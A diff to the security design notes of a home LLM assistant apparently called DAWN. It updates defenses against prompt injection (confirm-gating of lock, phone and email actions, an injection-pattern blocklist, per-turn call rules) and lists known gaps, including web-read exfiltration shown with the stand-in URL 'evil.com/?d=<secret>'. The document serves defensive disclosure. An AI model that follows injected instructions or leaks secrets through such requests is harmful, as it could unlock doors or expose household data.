@@ -90,22 +90,27 @@ WebSocket/HTTP handlers call `conn_require_admin()` (enforced in `webui_admin.c`
 | OTA fleet management | ✓ | ✗ | ✗ | ✗ | ✗ |
 | Secrets (API keys, tokens) | ✓ | ✗ | ✗ | ✗ | ✗ |
 
-¹ A messaging party converses through a bound "forever conversation" with the identity the
-operator linked. They are **not** a DAWN account and cannot authenticate; their authorization
-is entirely "the operator chose to link this channel." Their message text is **untrusted
-input** (see [Prompt-Injection Hardening](#prompt-injection-hardening)).
+¹ A messaging channel is linked by a DAWN user (a code from their account) and answers only
+the provider identity that linked it: in a group, only that member's messages. An SMS link
+also proves the number with a code texted to it. A text can still claim any number, so SMS
+turns are **unverified**: they read and prepare freely, and anything that acts waits for a
+reply code ([confused-deputy](#the-llm-agent-as-a-confused-deputy) item 5). Message text is
+**untrusted input** (see [Prompt-Injection Hardening](#prompt-injection-hardening)).
 
 ² **Real-world-action tools are NOT role-gated — this is a deliberate single-admin-home
 default, and a real risk otherwise.** The conversational tool path (`command_execute()` →
 registry callback, `llm_tools.c` / `command_executor.c`) contains **no `is_admin` check**.
-Tool availability is gated only by session *type* (`enabled_local` / `enabled_remote`) and an
-admin-wide config toggle — never by the acting user's role. So **any** authenticated session —
+Tool availability is gated by session *type* (`enabled_local` / `enabled_remote`), an
+admin-wide config toggle and the kind of turn (who may act: user, unverified SMS sender,
+background job, unattended; confused-deputy item 5), never by the acting user's role. So **any** authenticated session —
 a non-admin browser, or a satellite mapped to a non-admin user — can say *"unlock the front
-door"* and the assistant will invoke `home_assistant`. Only the WebUI HA **board** verb
+door"* and the assistant will invoke `home_assistant` (which previews the unlock and waits for
+that session's yes). Only the WebUI HA **board** verb
 (`handle_ha_call_service`, `conn_require_admin`-gated **and** `HA_BOARD_SERVICES[]`-allowlisted)
-and the **configuration** of these subsystems are admin-restricted. Phone and email add a
-two-step confirm (`confirm_outbound`), but that confirmation is satisfied by whoever is in the
-conversation, not by an admin. The phone banner's answer/reject fan-out to a satellite is
+and the **configuration** of these subsystems are admin-restricted. Phone (`confirm_outbound`, plus
+anything uncertain), email (always) and HA unlock/open preview and confirm, bound to that
+session's next turn, but the confirmation is satisfied by whoever is in the conversation, not
+by an admin. The phone banner's answer/reject fan-out to a satellite is
 display-only — but HA *control* is a genuine write capability from any session. This is the
 coarse-authorization gap (#4) and the [confused-deputy](#the-llm-agent-as-a-confused-deputy)
 surface: fine for a single-admin household, a real risk under multi-user or prompt injection.
@@ -181,11 +186,17 @@ DAWN's defenses against this are layered, and each is a real, shipped mechanism:
 
 1. **Capability flags at the registry** (`tool_registry.h`): every tool declares
    `TOOL_CAP_DANGEROUS` / `NETWORK` / `FILESYSTEM` / `SECRETS` / `SCHEDULABLE`. Dangerous
-   tools (e.g. shutdown) require an explicit config enable; the flags also drive what is
-   allowed in a scheduled context.
-2. **Two-step confirmation on irreversible outward actions**: email send/trash, phone
-   call/SMS (`confirm_outbound`), and document delete require a human confirmation turn — an
-   injected instruction cannot complete them autonomously.
+   tools (e.g. shutdown) require an explicit config enable; `SCHEDULABLE` marks a tool a
+   schedule may run, and `validate_schedulable_action` refuses individual actions (checked when
+   the schedule is made and when it fires).
+2. **Preview and confirm on irreversible actions**: email send/trash, phone call/SMS,
+   document delete, deep research, and Home Assistant unlock (any lock) and anything else that
+   opens a door: opening a garage-door or gate cover, or turning on a switch, scene, script or
+   automation named for a garage, gate, door or unlock. The confirm runs only in the same
+   session, in the user's very next turn (or, approved by the user's SMS reply code, a later
+   turn of that session), and only for the item its preview named (`core/pending_slots`, `turn_origin_t`), so a re-staged
+   item or a later "yes" can't carry out something else. Phone keeps its preview for anything
+   uncertain even with `confirm_outbound = false`.
 3. **The memory injection filter** (`memory_filter.c` → `memory_filter_check()`): a blocklist
    of high-confidence injection command/ReAct/XML patterns, applied at the untrusted-ingestion
    points — inbound messaging, web search/fetch, the note bridge, silent-observe, background-job
@@ -200,15 +211,28 @@ DAWN's defenses against this are layered, and each is a real, shipped mechanism:
    `home_assistant` tool**, which the tool path exposes to any authenticated session with no
    role check (footnote ² / Gap #4), so it is not a defense against injection in a chat session.
 
+5. **Who may make a call** (`core/tool_call_policy.c`, see
+   [command-processing.md](arch/command-processing.md#who-may-make-a-call-kinds-of-action)):
+   every tool action has a kind (read, fetch, state, device, prepare, act), and the turn decides
+   who is calling. A background job may read and fetch but never act; an unattended turn (a
+   job's follow-up, or no user turn at all) may only read and change session state. A text message can claim any sender,
+   so an SMS turn may read and prepare, and anything that acts, fetches or plays waits for a
+   6-digit code DAWN texts to the number; a forger never receives it. SMS conversations are
+   private, so a forged text is never learned into memory.
+6. **Recipients are never guessed** (`tools/contact_resolve.c`): a call, text or email goes to a
+   contact only when the name is certain and is one the user said. A name taken from content
+   the model read (an email, a web page), a partial name or a near-miss is previewed for the
+   user to confirm. A literal address in "to" is exactly one address.
+
 **The residual gap is real and tracked**, and broader than "not confirm-gated." Because the
 tool path carries no role check, prompt injection into a **non-admin** session reaches the same
 lock/dial/send authority as an admin — a session's capabilities are not reduced by its user's
-role. On top of that, not every autonomously-reachable tool is even confirm-gated: Home
-Assistant *control* fires without a confirm turn (an injected result on a reinvoke could act on
-a lock), and the web read tools are an unguarded **exfiltration** channel
-(`evil.com/?d=<secret>` — the outbound *request itself* is the leak, which no ingestion filter
-stops). These are the *"autonomously-dangerous tool classification pass"* and coarse-authorization
-items in the TODO — see [Known Gaps](#known-gaps).
+role. Background turns can no longer act (item 5), and door-opening Home Assistant actions wait
+for a yes (item 2). What remains is the **live user turn**: there, the web read tools are an
+**exfiltration** channel (`evil.com/?d=<secret>`, the outbound *request itself* is the leak,
+which no ingestion filter stops), and other Home Assistant control (lights, climate, locking)
+still acts directly. This is the capability-mask work in the TODO — see
+[Known Gaps](#known-gaps).
 
 ---
 
@@ -384,13 +408,13 @@ Known Gaps.
 
 Open, acknowledged, and contributor help is welcome. Each maps to a tracked TODO item.
 
-1. **Not every autonomously-reachable tool is confirm-gated.** HA *control* (lock/cover/
-   climate) fires immediately, and the web read tools (`search`, `url`) are an unguarded
-   data-exfiltration channel — the outbound *request* to `evil.com/?d=<secret>` is the leak, so
-   the ingestion filter that scans fetched *content* does not help. A deliberate classification
-   pass over every registered tool (confirm-gated / autonomous-safe / autonomously-dangerous)
-   and, likely, a new capability/deny flag is the fix. *(TODO: "Tool audit:
-   autonomously-dangerous classification pass.")*
+1. **Exfiltration through web reads in a live user turn.** Every action now has a kind; a
+   background job can't act, and an unattended turn can't fetch (confused-deputy item 5), but in
+   a turn the user started,
+   the web read tools (`search`, `url`) can still carry data out: the outbound *request* to
+   `evil.com/?d=<secret>` is the leak, so the ingestion filter that scans fetched *content* does
+   not help. A per-session capability mask ("propose, don't act" after reading untrusted
+   content) is the fix. *(TODO: "Capability mask Phase 2.")*
 
 2. **SSRF on the native web-fetch path — CLOSED for `url_fetch`/`search` (2026-08, deep-research
    branch); FlareSolverr residual remains.** The native curl path now installs a
@@ -414,11 +438,11 @@ Open, acknowledged, and contributor help is welcome. Each maps to a tracked TODO
    user's authority. More sharply: the conversational tool path performs **no role check
    whatsoever** — HA control, phone, and email send are reachable by *any* authenticated session
    (non-admin browser, satellite mapped to a non-admin, or a linked messaging channel), gated
-   only by session type + an admin-wide config toggle (footnote ² / the confused-deputy
-   section). Only the WebUI admin *board* verb and subsystem *configuration* are
-   `conn_require_admin`-gated. This is an accepted default for a single-admin household; a
-   per-capability grant and a "propose, don't act" tool-mask for background/reinvoke turns would
-   close it and compose with gap #1.
+   by session type, an admin-wide config toggle and the kind of turn, not the user's role
+   (footnote ² / the confused-deputy section). Only the WebUI admin *board* verb and subsystem
+   *configuration* are `conn_require_admin`-gated. This is an accepted default for a
+   single-admin household; a per-capability grant would close it. Background and unattended
+   turns already can't act; the live user turn is gap #1.
 
 5. **Cleartext credentials over `ws://`/`http://` on the LAN.** The HA long-lived token (and,
    historically, REST traffic) crosses the LAN in cleartext when TLS is not configured for the
@@ -446,8 +470,7 @@ Open, acknowledged, and contributor help is welcome. Each maps to a tracked TODO
    reinforced — so no cross-user reach and no fact creation), and each bump is rate-limited to
    once per fact per hour, clamped (≤0.5), and ceilinged at 1.0. The durable fix is to withhold
    reinforcement on turns that ran an outward-reading tool, which composes with gap #1's
-   capability mask. *(TODO: "Tool audit: autonomously-dangerous classification pass" /
-   `CAPABILITY_MASK_DESIGN.md`.)*
+   capability mask. *(TODO: "Capability mask Phase 2" / `CAPABILITY_MASK_DESIGN.md`.)*
 
 10. **Schwab enrollment is operator-trust (SO_PEERCRED), not admin-password-gated.** The
    `dawn-admin schwab auth`/`status` opcodes (`0xE3-0xE5`) sit in the same peer-cred operator
